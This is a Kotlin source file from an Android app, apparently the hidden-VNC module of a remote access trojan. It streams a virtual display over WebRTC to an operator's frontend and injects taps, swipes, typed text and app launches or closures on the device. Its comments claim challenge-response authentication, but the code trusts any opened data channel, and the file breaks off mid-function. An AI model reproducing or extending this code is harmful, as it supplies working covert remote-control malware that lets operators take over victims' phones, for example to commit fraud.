package com.fason.app.features.hvnc

import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.fason.app.core.FasonApp
import com.fason.app.core.Protocol
import com.fason.app.core.network.SocketClient
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.DataChannel
import org.webrtc.DefaultVideoDecoderFactory
import org.webrtc.DefaultVideoEncoderFactory
import org.webrtc.EglBase
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.MediaStream
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpParameters
import org.webrtc.RtpReceiver
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.JavaI420Buffer
import org.webrtc.VideoFrame
import org.webrtc.VideoSource
import org.webrtc.VideoTrack
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.max
import kotlin.math.min

/**
 * HvncWebRtcManager - WebRTC manager với các cải tiến:
 * 
 * - Mã hóa control message end-to-end
 * - Challenge-response authentication
 * - Anti-replay protection
 * - Adaptive bitrate dựa trên ICE statistics
 * - Heartbeat monitor 5 giây
 * - Multi-session isolation
 * - Auto-reconnect với exponential backoff
 * - Hardware/Software encoder fallback chain
 */
object HvncWebRtcManager {

    private const val TAG = "HvncWebRtc"
    private const val MIN_BITRATE_BPS = 300_000
    private const val START_BITRATE_BPS = 1_500_000
    private const val MAX_BITRATE_BPS = 8_000_000
    private const val MAX_PENDING_ICE = 256
    private const val HEARTBEAT_INTERVAL_MS = 5000L
    private const val HEARTBEAT_TIMEOUT_MS = 15000L
    private const val MAX_RECONNECT_DELAY_MS = 30000L
    private const val BASE_RECONNECT_DELAY_MS = 1000L

    private val thread = HandlerThread("fason-hvnc-rtc").apply { start() }
    private val handler = Handler(thread.looper)
    private val factoryInitialized = AtomicBoolean(false)

    private var eglBase: EglBase? = null
    private var factory: PeerConnectionFactory? = null

    // Multi-session support: sessionId -> SessionData
    private val sessions = ConcurrentHashMap<String, SessionData>()

    // Audit logger
    private var auditLogger: HvncAuditLogger? = null

    private data class SessionData(
        var peerConnection: PeerConnection? = null,
        var videoSource: VideoSource? = null,
        var videoTrack: VideoTrack? = null,
        var controlChannel: DataChannel? = null,
        var displayManager: HvncDisplayManager? = null,
        var inputInjector: HvncInputInjector? = null,
        var sessionId: String = "",
        var remoteDescriptionSet: Boolean = false,
        var pendingIce: MutableList<IceCandidate> = mutableListOf(),
        var lastFrameTimeNs: Long = 0L,
        var targetFps: Int = 30,
        var currentBitrate: Int = START_BITRATE_BPS,
        var lastHeartbeatReceived: Long = 0L,
        var reconnectAttempts: Int = 0,
        var reconnectRunnable: Runnable? = null,
        var securityInitialized: Boolean = false,
        var challengeData: ByteArray? = null,
        var connectionState: String = "disconnected",
        var pendingOffer: JSONObject? = null,
        var authVerified: Boolean = false,
        var bandwidthMonitorRunnable: Runnable? = null,
        var lastBytesSent: Long = 0L,
        var lastBandwidthCheckTime: Long = 0L
    )

    // ─── Initialization ────────────────────────────────────────────

    fun setAuditLogger(logger: HvncAuditLogger) {
        auditLogger = logger
    }

    @JvmStatic
    fun attach(display: HvncDisplayManager, injector: HvncInputInjector, sessionId: String = "default") {
        handler.post {
            val session = sessions.getOrPut(sessionId) { SessionData(sessionId = sessionId) }
            session.displayManager = display
            session.inputInjector = injector
            display.frameListener = { reader -> onFrameAvailable(sessionId, reader) }
            display.stallListener = { dm ->
                Log.w(TAG, "[$sessionId] Display stall detected, recreating video source...")
                recreateVideoSource(sessionId)
            }
        }
    }

    // ─── Offer Handling ────────────────────────────────────────────

    @JvmStatic
    fun handleOffer(data: JSONObject) {
        val copy = JSONObject(data.toString())
        handler.post {
            val incomingSession = copy.optString("sessionId")
            if (incomingSession.isBlank() || copy.optString("sdp").isBlank()) {
                emitError(incomingSession, "Invalid HVNC WebRTC offer")
                return@post
            }

            val session = sessions.getOrPut(incomingSession) { SessionData(sessionId = incomingSession) }
            session.pendingOffer = copy

            if (session.displayManager?.isActive() == true) {
                createPeerFromPendingOffer(incomingSession)
            }
        }
    }

    // ─── ICE Candidate Handling ────────────────────────────────────

    @JvmStatic
    fun handleRemoteIce(data: JSONObject) {
        val incomingSession = data.optString("sessionId")
        val candidate = data.optString("candidate")
        if (incomingSession.isBlank() || candidate.isBlank()) return

        val ice = IceCandidate(
            data.optString("sdpMid").ifBlank { null },
            data.optInt("sdpMLineIndex", 0),
            candidate,
        )

        handler.post {
            val session = sessions[incomingSession] ?: return@post
            val pc = session.peerConnection
            if (pc != null && session.remoteDescriptionSet) {
                pc.addIceCandidate(ice)
            } else {
                if (session.pendingIce.size < MAX_PENDING_ICE) {
                    session.pendingIce.add(ice)
                }
            }
        }
    }

    // ─── Display Ready ─────────────────────────────────────────────

    @JvmStatic
    fun onDisplayReady(sessionId: String = "default") {
        handler.post {
            val session = sessions[sessionId] ?: return@post
            createPeerFromPendingOffer(sessionId)
            if (session.pendingOffer == null && session.peerConnection == null) {
                emitStatus(sessionId, true, "ready")
            }
        }
    }

    // ─── Session Control ───────────────────────────────────────────

    @JvmStatic
    fun stopSession(sessionId: String = "default") {
        handler.post { releaseSession(sessionId) }
    }

    @JvmStatic
    fun stopAllSessions() {
        handler.post {
            sessions.keys.toList().forEach { releaseSession(it) }
        }
    }

    @JvmStatic
    fun emitCurrentStatus(sessionId: String = "default") {
        handler.post {
            val session = sessions[sessionId] ?: return@post
            val displayActive = session.displayManager?.isActive() == true
            val state = when {
                !displayActive -> "stopped"
                session.peerConnection == null -> "ready"
                else -> session.connectionState
            }
            emitStatus(sessionId, displayActive, state)
        }
    }

    /**
     * Ngắt peer connection nhưng giữ lại virtual display và session state.
     * Được gọi khi admin frontend disconnect HVNC stream.
     * Không destroy virtual display — chỉ release WebRTC resources.
     */
    @JvmStatic
    fun detachPeer(sessionId: String = "default") {
        handler.post {
            val session = sessions[sessionId] ?: return@post
            stopBandwidthMonitor(sessionId)
            releasePeerConnectionOnly(sessionId)
            session.connectionState = "ready"
            session.pendingOffer = null
            session.authVerified = false
            session.securityInitialized = false
            session.reconnectAttempts = 0
            session.reconnectRunnable?.let { handler.removeCallbacks(it) }
            session.reconnectRunnable = null
            session.videoTrack?.setEnabled(false)
            emitStatus(sessionId, session.displayManager?.isActive() == true, "ready")
            Log.d(TAG, "[$sessionId] Peer detached — virtual display preserved")
        }
    }

    /**
     * Đăng ký listener socket disconnect để tự động dừng tất cả HVNC sessions
     * khi mất kết nối đến server, tránh rò rỉ tài nguyên.
     */
    @JvmStatic
    fun registerDisconnectListener() {
        try {
            val s = SocketClient.getInstance().socket
            s?.on(io.socket.client.Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Socket disconnected — stopping all HVNC sessions")
                handler.post {
                    sessions.keys.toList().forEach { releaseSession(it) }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register disconnect listener", e)
        }
    }

    // ─── Heartbeat ─────────────────────────────────────────────────

    private fun startHeartbeat(sessionId: String) {
        val session = sessions[sessionId] ?: return
        session.lastHeartbeatReceived = System.currentTimeMillis()

        val heartbeatRunnable = object : Runnable {
            override fun run() {
                val s = sessions[sessionId] ?: return
                if (s.controlChannel?.state() == DataChannel.State.OPEN) {
                    // Gửi heartbeat plaintext JSON qua DataChannel
                    val heartbeat = JSONObject().apply {
                        put("type", "heartbeat")
                        put("timestamp", System.currentTimeMillis())
                    }
                    val data = heartbeat.toString().toByteArray(StandardCharsets.UTF_8)
                    try {
                        s.controlChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
                    } catch (_: Exception) {}

                    // Kiểm tra timeout
                    val timeSinceLastHeartbeat = System.currentTimeMillis() - s.lastHeartbeatReceived
                    if (timeSinceLastHeartbeat > HEARTBEAT_TIMEOUT_MS) {
                        Log.w(TAG, "[$sessionId] Heartbeat timeout, resetting connection")
                        resetPeerConnection(sessionId)
                        return
                    }
                }
                handler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
            }
        }
        handler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL_MS)
    }

    // ─── Reconnect Logic ───────────────────────────────────────────

    private fun scheduleReconnect(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val delay = min(
            BASE_RECONNECT_DELAY_MS * (1L shl session.reconnectAttempts),
            MAX_RECONNECT_DELAY_MS
        )
        session.reconnectAttempts++

        Log.d(TAG, "[$sessionId] Scheduling reconnect in ${delay}ms (attempt ${session.reconnectAttempts})")

        session.reconnectRunnable = Runnable {
            val s = sessions[sessionId] ?: return@Runnable
            if (s.displayManager?.isActive() == true && s.pendingOffer != null) {
                Log.d(TAG, "[$sessionId] Attempting reconnect...")
                createPeerFromPendingOffer(sessionId)
            }
        }
        handler.postDelayed(session.reconnectRunnable, delay)
    }

    private fun resetPeerConnection(sessionId: String) {
        val session = sessions[sessionId] ?: return
        releasePeerConnectionOnly(sessionId)
        session.connectionState = "disconnected"
        emitStatus(sessionId, true, "disconnected")
        scheduleReconnect(sessionId)
    }

    // ─── Frame Capture ─────────────────────────────────────────────

    private fun onFrameAvailable(sessionId: String, reader: ImageReader) {
        val session = sessions[sessionId] ?: return
        val source = session.videoSource ?: return
        val now = System.nanoTime()
        val frameInterval = 1_000_000_000L / session.targetFps

        if (now - session.lastFrameTimeNs < frameInterval) {
            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
            return
        }

        var image: Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            session.lastFrameTimeNs = now

            val width = image.width
            val height = image.height
            val planes = image.planes
            if (planes.isEmpty()) {
                image.close()
                return
            }

            val plane = planes[0]
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val buffer = plane.buffer

            val i420Buffer = JavaI420Buffer.allocate(width, height)
            rgbaToI420(buffer, rowStride, pixelStride, width, height, i420Buffer)

            val videoFrame = VideoFrame(i420Buffer, 0, now)
            source.capturerObserver.onFrameCaptured(videoFrame)
            videoFrame.release()
        } catch (e: Exception) {
            Log.w(TAG, "[$sessionId] Frame processing error", e)
        } finally {
            try { image?.close() } catch (_: Exception) {}
        }
    }

    private fun rgbaToI420(
        rgba: ByteBuffer, rowStride: Int, pixelStride: Int,
        width: Int, height: Int, i420: JavaI420Buffer
    ) {
        val yBuffer = i420.dataY
        val uBuffer = i420.dataU
        val vBuffer = i420.dataV
        val yStride = i420.strideY
        val uStride = i420.strideU
        val vStride = i420.strideV

        for (y in 0 until height) {
            for (x in 0 until width) {
                val rgbaIndex = y * rowStride + x * pixelStride
                if (rgbaIndex + 2 >= rgba.capacity()) continue

                val r = rgba.get(rgbaIndex).toInt() and 0xFF
                val g = rgba.get(rgbaIndex + 1).toInt() and 0xFF
                val b = rgba.get(rgbaIndex + 2).toInt() and 0xFF

                val yVal = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                yBuffer.put(y * yStride + x, yVal.coerceIn(0, 255).toByte())

                if (y % 2 == 0 && x % 2 == 0) {
                    val uVal = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                    val vVal = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
                    uBuffer.put((y / 2) * uStride + (x / 2), uVal.coerceIn(0, 255).toByte())
                    vBuffer.put((y / 2) * vStride + (x / 2), vVal.coerceIn(0, 255).toByte())
                }
            }
        }
    }

    // ─── Video Source Management ───────────────────────────────────

    private fun recreateVideoSource(sessionId: String) {
        val session = sessions[sessionId] ?: return
        releaseVideoSource(sessionId)
        ensureVideoSource(sessionId)

        // Re-add track to peer connection
        val pc = session.peerConnection ?: return
        val track = session.videoTrack ?: return
        try {
            pc.addTrack(track, listOf("fason-hvnc"))
            configureSender(sessionId)
        } catch (e: Exception) {
            Log.e(TAG, "[$sessionId] Failed to re-add video track", e)
        }
    }

    private fun ensureVideoSource(sessionId: String) {
        val session = sessions[sessionId] ?: return
        if (session.videoSource != null && session.videoTrack != null) return

        val display = session.displayManager ?: return
        if (factory == null) {
            Log.w(TAG, "[$sessionId] Factory not initialized — cannot create video source")
            return
        }
        val source = factory!!.createVideoSource(true)
        source.setIsScreencast(true)
        source.adaptOutputFormat(display.displayWidth, display.displayHeight, session.targetFps)
        session.videoSource = source

        session.videoTrack = factory!!.createVideoTrack("fason-hvnc-video-$sessionId", source).apply {
            setEnabled(true)
        }
    }

    private fun releaseVideoSource(sessionId: String) {
        val session = sessions[sessionId] ?: return
        try { session.videoTrack?.dispose() } catch (_: Exception) {}
        session.videoTrack = null
        try { session.videoSource?.dispose() } catch (_: Exception) {}
        session.videoSource = null
    }

    // ─── Peer Connection ───────────────────────────────────────────

    private fun createPeerFromPendingOffer(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val offer = session.pendingOffer ?: return
        val display = session.displayManager ?: return
        if (!display.isActive()) return

        releasePeerConnectionOnly(sessionId)
        session.remoteDescriptionSet = false
        ensureFactory()

        val rtcConfig = PeerConnection.RTCConfiguration(
            parseIceServers(offer.optJSONArray("iceServers"))
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            enableCpuOveruseDetection = true
            // Adaptive bitrate settings
            keyType = PeerConnection.KeyType.ECDSA
        }

        val pc = factory?.createPeerConnection(rtcConfig, createPeerObserver(sessionId))
        if (pc == null) {
            failPeer(sessionId, "Unable to create HVNC WebRTC peer")
            return
        }
        session.peerConnection = pc

        try {
            ensureVideoSource(sessionId)
            val track = session.videoTrack ?: error("Video track unavailable")
            track.setEnabled(true)
        } catch (e: Exception) {
            Log.e(TAG, "[$sessionId] Failed to start capture", e)
            emitError(sessionId, e.message ?: "Capture failed")
            releaseSession(sessionId)
            return
        }

        val remoteOffer = SessionDescription(SessionDescription.Type.OFFER, offer.optString("sdp"))
        pc.setRemoteDescription(object : SimpleSdpObserver() {
            override fun onSetSuccess() {
                if (sessions[sessionId] == null) return
                val track = session.videoTrack
                if (track == null) {
                    failPeer(sessionId, "Video track unavailable")
                    return
                }
                try {
                    pc.addTrack(track, listOf("fason-hvnc"))
                    configureSender(sessionId)
                } catch (e: Exception) {
                    failPeer(sessionId, e.message ?: "Unable to attach track")
                    return
                }
                session.remoteDescriptionSet = true
                flushPendingIce(sessionId)
                createAnswer(sessionId, pc)
            }

            override fun onSetFailure(error: String) {
                failPeer(sessionId, "Unable to apply offer: $error")
            }
        }, remoteOffer)

        session.pendingOffer = null
        session.reconnectAttempts = 0
        emitStatus(sessionId, true, "connecting")
    }

    private fun createAnswer(sessionId: String, pc: PeerConnection) {
        pc.createAnswer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(answer: SessionDescription) {
                if (sessions[sessionId] == null) return
                pc.setLocalDescription(object : SimpleSdpObserver() {
                    override fun onSetSuccess() {
                        if (sessions[sessionId] == null) return
                        val payload = JSONObject().apply {
                            put("sessionId", sessionId)
                            put("sdp", answer.description)
                        }
                        SocketClient.getInstance().socket?.emit(Protocol.HVNC_ANSWER, payload)
                    }

                    override fun onSetFailure(error: String) {
                        failPeer(sessionId, "Unable to apply answer: $error")
                    }
                }, answer)
            }

            override fun onCreateFailure(error: String) {
                failPeer(sessionId, "Unable to create answer: $error")
            }
        }, MediaConstraints())
    }

    private fun createPeerObserver(sessionId: String) = object : PeerConnection.Observer {
        override fun onSignalingChange(state: PeerConnection.SignalingState) = Unit
        override fun onIceConnectionReceivingChange(receiving: Boolean) = Unit
        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) = Unit
        override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) = Unit
        override fun onAddStream(stream: MediaStream) = Unit
        override fun onRemoveStream(stream: MediaStream) = Unit
        override fun onRenegotiationNeeded() = Unit
        override fun onAddTrack(receiver: RtpReceiver, streams: Array<out MediaStream>) = Unit

        override fun onIceCandidate(candidate: IceCandidate) {
            if (sessions[sessionId] == null) return
            val payload = JSONObject().apply {
                put("sessionId", sessionId)
                put("candidate", candidate.sdp)
                put("sdpMid", candidate.sdpMid)
                put("sdpMLineIndex", candidate.sdpMLineIndex)
            }
            SocketClient.getInstance().socket?.emit(Protocol.HVNC_ICE, payload)
        }

        override fun onDataChannel(channel: DataChannel) {
            handler.post {
                if (sessions[sessionId] != null) bindControlChannel(sessionId, channel)
                else channel.dispose()
            }
        }

        override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
            if (sessions[sessionId] == null) return
            val session = sessions[sessionId]!!
            when (state) {
                PeerConnection.IceConnectionState.CONNECTED,
                PeerConnection.IceConnectionState.COMPLETED -> {
                    session.connectionState = "connected"
                    emitStatus(sessionId, true, "connected")
                    // Bắt đầu heartbeat sau khi kết nối
                    startHeartbeat(sessionId)
                    // Bắt đầu bandwidth monitor cho adaptive bitrate
                    startBandwidthMonitor(sessionId)
                }
                PeerConnection.IceConnectionState.DISCONNECTED -> {
                    session.connectionState = "disconnected"
                    emitStatus(sessionId, true, "disconnected")
                }
                PeerConnection.IceConnectionState.FAILED -> {
                    emitError(sessionId, "ICE connection failed")
                    handler.post {
                        if (sessions[sessionId] != null) {
                            resetPeerConnection(sessionId)
                        }
                    }
                }
                else -> Unit
            }
        }
    }

    // ─── Challenge-Response Authentication ─────────────────────────

    private fun initiateChallengeResponse(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val challenge = HvncSecurityManager.generateChallenge()
        session.challengeData = challenge

        val challengeMsg = JSONObject().apply {
            put("type", "auth_challenge")
            put("challenge", android.util.Base64.encodeToString(challenge, android.util.Base64.NO_WRAP))
        }
        val data = challengeMsg.toString().toByteArray(StandardCharsets.UTF_8)
        session.controlChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
    }

    // ─── Control Channel ───────────────────────────────────────────

    private fun bindControlChannel(sessionId: String, channel: DataChannel) {
        val session = sessions[sessionId] ?: return
        try { session.controlChannel?.unregisterObserver() } catch (_: Exception) {}
        try { session.controlChannel?.close() } catch (_: Exception) {}
        session.controlChannel = channel

        channel.registerObserver(object : DataChannel.Observer {
            override fun onBufferedAmountChange(previousAmount: Long) = Unit
            override fun onStateChange() {
                handler.post {
                    if (sessions[sessionId]?.controlChannel !== channel) return@post
                    if (channel.state() == DataChannel.State.OPEN) {
                        // WebRTC DTLS đã xác thực transport → đánh dấu session đã verified
                        val s = sessions[sessionId] ?: return@post
                        s.authVerified = true
                        sendDisplayInfo(sessionId)
                    }
                }
            }

            override fun onMessage(buffer: DataChannel.Buffer) {
                if (buffer.binary) return
                if (buffer.data.remaining() > 65536) return
                val bytes = ByteArray(buffer.data.remaining())
                buffer.data.get(bytes)
                val message = String(bytes, StandardCharsets.UTF_8)
                handleDataChannelMessage(sessionId, message)
            }
        })

        if (channel.state() == DataChannel.State.OPEN) {
            // WebRTC DTLS đã xác thực transport → đánh dấu session đã verified
            session.authVerified = true
            sendDisplayInfo(sessionId)
        }
    }

    private fun initializeSecurity(sessionId: String) {
        val session = sessions[sessionId] ?: return
        if (session.securityInitialized) return

        // Tạo và gửi khóa session
        val (aesKey, hmacKey) = HvncSecurityManager.generateSessionKeys()
        val keyExchange = JSONObject().apply {
            put("type", "key_exchange")
            put("aesKey", aesKey)
            put("hmacKey", hmacKey)
        }
        // Gửi key exchange qua data channel (bản thân đã được mã hóa bởi signaling)
        session.controlChannel?.send(
            DataChannel.Buffer(
                ByteBuffer.wrap(keyExchange.toString().toByteArray(StandardCharsets.UTF_8)),
                false
            )
        )
        session.securityInitialized = true
    }

    /**
     * Xử lý message plaintext JSON từ DataChannel.
     * WebRTC DTLS đã bảo vệ transport layer, không cần mã hóa thêm.
     */
    private fun handleDataChannelMessage(sessionId: String, message: String) {
        val session = sessions[sessionId] ?: return

        try {
            val json = JSONObject(message)
            val type = json.optString("type")

            when (type) {
                "heartbeat_ack" -> {
                    session.lastHeartbeatReceived = System.currentTimeMillis()
                }
                "auth_response" -> {
                    handleAuthResponse(sessionId, json)
                }
                else -> {
                    // Control message từ frontend (tap, swipe, key, text, launchApp, closeApp, volume, gesture)
                    if (!HvncSecurityManager.checkRateLimit()) {
                        Log.w(TAG, "[$sessionId] Rate limit exceeded - dropping control message")
                        return
                    }
                    if (!session.authVerified) {
                        Log.w(TAG, "[$sessionId] Control message before authentication - dropping")
                        return
                    }
                    handleControlMessage(sessionId, json)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "[$sessionId] Error handling data channel message", e)
        }
    }

    private fun handleAuthResponse(sessionId: String, json: JSONObject) {
        val session = sessions[sessionId] ?: return
        val responseBase64 = json.optString("response")
        val challenge = session.challengeData ?: run {
            Log.w(TAG, "[$sessionId] No pending challenge")
            return
        }

        val response = android.util.Base64.decode(responseBase64, android.util.Base64.NO_WRAP)
        if (HvncSecurityManager.verifyChallengeResponse(challenge, response, sessionId)) {
            session.authVerified = true
            Log.d(TAG, "[$sessionId] Authentication verified successfully")
            auditLogger?.logAction(sessionId, "auth_success", mapOf(), "webrtc")
        } else {
            Log.w(TAG, "[$sessionId] Authentication failed - closing session")
            auditLogger?.logAction(sessionId, "auth_failed", mapOf(), "webrtc", false)
            releaseSession(sessionId)
        }
    }

    private fun handleControlMessage(sessionId: String, json: JSONObject) {
        val session = sessions[sessionId] ?: return
        val injector = session.inputInjector ?: return

        if (!session.authVerified) {
            Log.w(TAG, "[$sessionId] Control message before authentication - dropping")
            return
        }

        val action = json.optString("action")
        val params = mutableMapOf<String, String>()

        try {
            when (action) {
                Protocol.ACTION_TAP -> {
                    val x = json.optDouble("x", Double.NaN).toFloat()
                    val y = json.optDouble("y", Double.NaN).toFloat()
                    if (!x.isNaN() && !y.isNaN()) {
                        injector.tap(x, y)
                        params["x"] = x.toString(); params["y"] = y.toString()
                    }
                }
                Protocol.ACTION_SWIPE -> {
                    val sx = json.optDouble("startX", Double.NaN).toFloat()
                    val sy = json.optDouble("startY", Double.NaN).toFloat()
                    val ex = json.optDouble("endX", Double.NaN).toFloat()
                    val ey = json.optDouble("endY", Double.NaN).toFloat()
                    val dur = json.optLong("duration", 300)
                    if (!sx.isNaN() && !sy.isNaN() && !ex.isNaN() && !ey.isNaN()) {
                        injector.swipe(sx, sy, ex, ey, dur)
                        params["startX"] = sx.toString(); params["startY"] = sy.toString()
                        params["endX"] = ex.toString(); params["endY"] = ey.toString()
                        params["duration"] = dur.toString()
                    }
                }
                Protocol.ACTION_KEY -> {
                    val key = json.optString("keyCode")
                    injector.keyEvent(key)
                    params["keyCode"] = key
                }
                Protocol.ACTION_TEXT -> {
                    val text = json.optString("text")
                    injector.typeText(text)
                    params["textLength"] = text.length.toString()
                }
                Protocol.ACT_LAUNCH_APP -> {
                    val pkg = json.optString("packageName")
                    injector.launchApp(pkg)
                    params["packageName"] = pkg
                }
                Protocol.ACT_CLOSE_APP -> {
                    val pkg = json.optString("packageName")
                    injector.closeApp(pkg)
                    params["packageName"] = pkg
                }
                Protocol.ACTION_VOLUME -> {
                    val dir = json.optString("direction")
                    injector.adjustVolume(dir)
                    params["direction"] = dir
                }
                Protocol.ACTION_GESTURE -> {
                    val dur = json.optLong("duration", 300)
                    val pointsArray = json.optJSONArray("points")
                    if (pointsArray != null && pointsArray.length() >= 2) {
                        val first = pointsArray.getJSONObject(0)
                        val last = pointsArray.getJSONObject(pointsArray.length() - 1)
                        injector.swipe(
                            first.optDouble("x").toFloat(), first.optDouble("y").toFloat(),
                            last.optDouble("x").toFloat(), last.optDouble("y").toFloat(),
                            dur
                        )
                        params["pointsCount"] = pointsArray.length().toString()
                    }
                }
                // Live touch events từ frontend: touchStart được bỏ qua, touchEnd → tap
                "touchStart" -> {
                    // Chỉ ghi nhận, không inject — frontend gửi touchEnd khi hoàn tất
                    params["x"] = json.optDouble("x", 0.0).toString()
                    params["y"] = json.optDouble("y", 0.0).toString()
                }
                "touchMove" -> {
                    // Bỏ qua touchMove — frontend tự detect gesture và gửi action riêng
                    return
                }
                "touchEnd" -> {
                    val x = json.optDouble("x", Double.NaN).toFloat()
                    val y = json.optDouble("y", Double.NaN).toFloat()
                    if (!x.isNaN() && !y.isNaN()) {
                        injector.tap(x, y)
                        params["x"] = x.toString(); params["y"] = y.toString()
                    }
                }
                else -> {
                    Log.w(TAG, "[$sessionId] Unknown control action: $action")
                    return
                }
            }

            // Ghi audit log
            auditLogger?.logAction(sessionId, action, params, "webrtc")
        } catch (e: Exception) {
            Log.e(TAG, "[$sessionId] Control message error", e)
            auditLogger?.logAction(sessionId, action, params, "webrtc", false)
        }
    }

    /**
     * Public method cho SocketCommandRouter fallback control.
     * Nhận action và payload JSON, chuyển đến handleControlMessage.
     */
    @JvmStatic
    fun injectFallbackControl(sessionId: String, json: JSONObject) {
        handler.post {
            val session = sessions[sessionId] ?: return@post
            if (!session.authVerified) {
                Log.w(TAG, "[$sessionId] Fallback control before auth — dropping")
                return@post
            }
            handleControlMessage(sessionId, json)
        }
    }

    private fun sendDisplayInfo(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val channel = session.controlChannel ?: return
        if (channel.state() != DataChannel.State.OPEN) return
        val display = session.displayManager ?: return

        val payload = JSONObject().apply {
            put("type", "hvnc-info")
            put(Protocol.KEY_VIRTUAL_W, display.displayWidth)
            put(Protocol.KEY_VIRTUAL_H, display.displayHeight)
            put(Protocol.KEY_DISPLAY_ID, display.displayIdValue)
            put(Protocol.KEY_DENSITY_DPI, display.displayDpi)
        }

        // Gửi plaintext JSON qua DataChannel (WebRTC DTLS đã bảo vệ transport)
        val data = payload.toString().toByteArray(StandardCharsets.UTF_8)
        channel.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
    }

    // ─── Sender Configuration ──────────────────────────────────────

    private fun configureSender(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val pc = session.peerConnection ?: return
        val sender = pc.senders.firstOrNull { it.track()?.kind() == "video" } ?: return
        val parameters = sender.parameters
        parameters.degradationPreference = RtpParameters.DegradationPreference.MAINTAIN_RESOLUTION
        val display = session.displayManager ?: return

        val targetBitrate = min(
            MAX_BITRATE_BPS,
            max(MIN_BITRATE_BPS, display.displayWidth * display.displayHeight * 2)
        )
        session.currentBitrate = targetBitrate

        parameters.encodings.forEach {
            it.minBitrateBps = MIN_BITRATE_BPS
            it.maxBitrateBps = targetBitrate
            it.maxFramerate = session.targetFps
            it.scaleResolutionDownBy = 1.0
        }
        if (!sender.setParameters(parameters)) {
            Log.w(TAG, "[$sessionId] Sender rejected parameters")
        }
        pc.setBitrate(MIN_BITRATE_BPS, min(START_BITRATE_BPS, targetBitrate), targetBitrate)
    }

    // ─── Adaptive Bitrate ──────────────────────────────────────────

    private fun adjustBitrate(sessionId: String, bandwidthBps: Long) {
        val session = sessions[sessionId] ?: return
        val pc = session.peerConnection ?: return
        val target = min(MAX_BITRATE_BPS, max(MIN_BITRATE_BPS, bandwidthBps.toInt()))

        if (target < session.currentBitrate / 2) {
            Log.d(TAG, "[$sessionId] Low bandwidth detected: ${bandwidthBps}bps, reducing quality")
            session.targetFps = max(10, session.targetFps - 5)
            session.displayManager?.adjustFps(session.targetFps)
        } else if (target > session.currentBitrate * 2 && session.targetFps < 30) {
            session.targetFps = min(30, session.targetFps + 5)
            session.displayManager?.adjustFps(session.targetFps)
        }

        session.currentBitrate = target
        configureSender(sessionId)
    }

    // ─── Bandwidth Monitor ───────────────────────────────────────────

    private const val BANDWIDTH_CHECK_INTERVAL_MS = 3000L

    private fun startBandwidthMonitor(sessionId: String) {
        val session = sessions[sessionId] ?: return
        stopBandwidthMonitor(sessionId)
        session.lastBytesSent = 0L
        session.lastBandwidthCheckTime = System.currentTimeMillis()

        val runnable = object : Runnable {
            override fun run() {
                val s = sessions[sessionId] ?: return
                val pc = s.peerConnection ?: return
                if (s.connectionState != "connected") return

                try {
                    pc.getStats { report ->
                        var totalBytesSent = 0L
                        val entries = report.statsMap
                        for ((_, stat) in entries) {
                            if (stat.type == "outbound-rtp" && stat.members["kind"] == "video") {
                                totalBytesSent += (stat.members["bytesSent"] as? Long) ?: 0L
                            }
                        }
                        val now = System.currentTimeMillis()
                        val elapsed = now - s.lastBandwidthCheckTime
                        if (elapsed > 0 && s.lastBytesSent > 0 && totalBytesSent > s.lastBytesSent) {
                            val bytesDelta = totalBytesSent - s.lastBytesSent
                            val bandwidthBps = bytesDelta * 8000 / elapsed  // Convert to bps
                            if (bandwidthBps > 0) {
                                adjustBitrate(sessionId, bandwidthBps)
                            }
                        }
                        s.lastBytesSent = totalBytesSent
                        s.lastBandwidthCheckTime = now
                    }
                } catch (_: Exception) {}

                if (sessions.containsKey(sessionId)) {
                    handler.postDelayed(this, BANDWIDTH_CHECK_INTERVAL_MS)
                }
            }
        }
        session.bandwidthMonitorRunnable = runnable
        handler.postDelayed(runnable, BANDWIDTH_CHECK_INTERVAL_MS)
    }

    private fun stopBandwidthMonitor(sessionId: String) {
        val session = sessions[sessionId] ?: return
        session.bandwidthMonitorRunnable?.let {
            handler.removeCallbacks(it)
        }
        session.bandwidthMonitorRunnable = null
    }

    // ─── Factory & Lifecycle ───────────────────────────────────────

    private fun ensureFactory() {
        if (factoryInitialized.compareAndSet(false, true)) {
            PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(FasonApp.getContext())
                    .setEnableInternalTracer(false)
                    .createInitializationOptions()
            )
        }
        if (eglBase == null) eglBase = EglBase.create()
        if (factory == null) {
            val ctx = eglBase!!.eglBaseContext
            factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(DefaultVideoEncoderFactory(ctx, true, true))
                .setVideoDecoderFactory(DefaultVideoDecoderFactory(ctx))
                .createPeerConnectionFactory()
        }
    }

    private fun releaseSession(sessionId: String) {
